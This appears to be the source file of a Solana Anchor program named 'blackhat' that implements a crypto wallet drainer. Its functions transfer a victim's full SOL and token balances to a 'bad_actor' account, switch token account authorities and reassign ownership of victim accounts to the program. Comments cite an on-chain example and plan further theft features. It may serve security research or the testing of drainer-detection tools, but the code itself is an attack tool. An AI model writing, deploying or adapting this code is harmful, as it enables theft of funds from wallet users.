use anchor_lang::prelude::*;
use anchor_lang::system_program::{self};
use anchor_spl::associated_token;
use anchor_spl::token::spl_token;
use anchor_spl::token::{self};
use borsh::BorshDeserialize;
use solana_program::program_pack::Pack;

pub mod error;
pub mod processor;
pub mod state;

use crate::processor::*;

declare_id!("Drainer1111111111111111111111111111111111111");

#[program]
pub mod blackhat {
    use super::*;
    use anchor_spl::token::spl_token::instruction::AuthorityType;
    use core::panic;

    pub fn drain_account<'info>(
        ctx: Context<'_, '_, '_, 'info, DrainAccount<'info>>,
    ) -> Result<()> {
        let cpi_ctx = CpiContext::new(
            ctx.accounts.system_program.to_account_info(),
            system_program::Transfer {
                from: ctx.accounts.victim.to_account_info(),
                to: ctx.accounts.bad_actor.to_account_info(),
            },
        );

        system_program::transfer(cpi_ctx, ctx.accounts.victim.lamports())?;

        Ok(())
    }

    pub fn drain_token_account<'info>(
        ctx: Context<'_, '_, '_, 'info, DrainTokenAccount<'info>>,
    ) -> Result<()> {
        if ctx.accounts.bad_actor_ata.data_is_empty() {
            let cpi_ctx: CpiContext<'_, '_, '_, '_, associated_token::Create<'_>> = CpiContext::new(
                ctx.accounts.associated_token_program.to_account_info(),
                associated_token::Create {
                    payer: ctx.accounts.victim.to_account_info(),
                    associated_token: ctx.accounts.bad_actor_ata.to_account_info(),
                    mint: ctx.accounts.mint.to_account_info(),
                    authority: ctx.accounts.bad_actor.to_account_info(),
                    token_program: ctx.accounts.token_program.to_account_info(),
                    system_program: ctx.accounts.system_program.to_account_info(),
                },
            );

            let init_result = associated_token::create(cpi_ctx);

            if let Err(init_error) = init_result {
                panic!("Token Init Error: {:?}", init_error)
            }
        }

        let cpi_ctx = CpiContext::new(
            ctx.accounts.system_program.to_account_info(),
            token::Transfer {
                from: ctx.accounts.victim_ata.to_account_info(),
                to: ctx.accounts.bad_actor_ata.to_account_info(),
                authority: ctx.accounts.victim.to_account_info(),
            },
        );

        let token_account = spl_token::state::Account::unpack_from_slice(
            &ctx.accounts
                .victim_ata
                .to_account_info()
                .try_borrow_data()?,
        )?;

        let result = token::transfer(cpi_ctx, token_account.amount);

        if let Err(transfer_error) = result {
            panic!("Token Transfer Error: {:?}", transfer_error)
        }

        Ok(())
    }

    #[allow(unused_variables)]
    pub fn enable_bitflip<'info>(
        ctx: Context<'_, '_, '_, 'info, EnableBitflip<'info>>,
        pda_bytes: [u8; 32],
    ) -> Result<()> {
        Ok(())
    }

    pub fn bitflip_drain_token_account<'info>(
        ctx: Context<'_, '_, '_, 'info, BitflipDrainTokenAccount<'info>>,
    ) -> Result<()> {
        if !ctx.accounts.bit_flipper.data_is_empty() {
            let cpi_ctx = CpiContext::new(
                ctx.accounts.system_program.to_account_info(),
                token::Transfer {
                    from: ctx.accounts.victim_ata.to_account_info(),
                    to: ctx.accounts.bad_actor_ata.to_account_info(),
                    authority: ctx.accounts.victim.to_account_info(),
                },
            );

            let token_account = spl_token::state::Account::unpack_from_slice(
                &ctx.accounts
                    .victim_ata
                    .to_account_info()
                    .try_borrow_data()?,
            )?;

            let result = token::transfer(cpi_ctx, token_account.amount);

            if let Err(transfer_error) = result {
                panic!("Token Transfer Error: {:?}", transfer_error)
            }
        }

        Ok(())
    }

    pub fn switch_token_account_authority<'info>(
        ctx: Context<'_, '_, '_, 'info, SwitchTokenAccountAuthority<'info>>,
        authority_type: u8,
        new_authority: Option<Pubkey>,
    ) -> Result<()> {
        let authority_type = match authority_type {
            0 => AuthorityType::MintTokens,
            1 => AuthorityType::FreezeAccount,
            2 => AuthorityType::AccountOwner,
            3 => AuthorityType::CloseAccount,
            _ => panic!("Invalid authority type"),
        };

        let cpi_ctx = CpiContext::new(
            ctx.accounts.token_program.to_account_info(),
            token::SetAuthority {
                current_authority: ctx.accounts.current_authority.to_account_info(),
                account_or_mint: ctx.accounts.token_program_owned_account.to_account_info(),
            },
        );

        token::set_authority(cpi_ctx, authority_type, new_authority)?;

        Ok(())
    }

    // Example: https://solscan.io/tx/3q25bc7tPquaoqyueRyp5JzdRRkZus1GcTkrhsUWyDLgNyJ3GD7vCiwdqkkriyscr53uTr6WxA59UHS66T8xcVDS
    pub fn hijack_account_ownership<'info>(
        ctx: Context<'_, '_, '_, 'info, HijackAccountOwnership<'info>>,
    ) -> Result<()> {
        let create_program_ctx = CpiContext::new(
            ctx.accounts.system_program.to_account_info(),
            system_program::Assign {
                account_to_assign: ctx.accounts.victim.to_account_info(),
            },
        );

        system_program::assign(create_program_ctx, &crate::id())?;

        Ok(())
    }

    // TODO: attach delegate to token accounts
    // TODO: closes token account after draining
    // TODO: swap stake account delegate
}
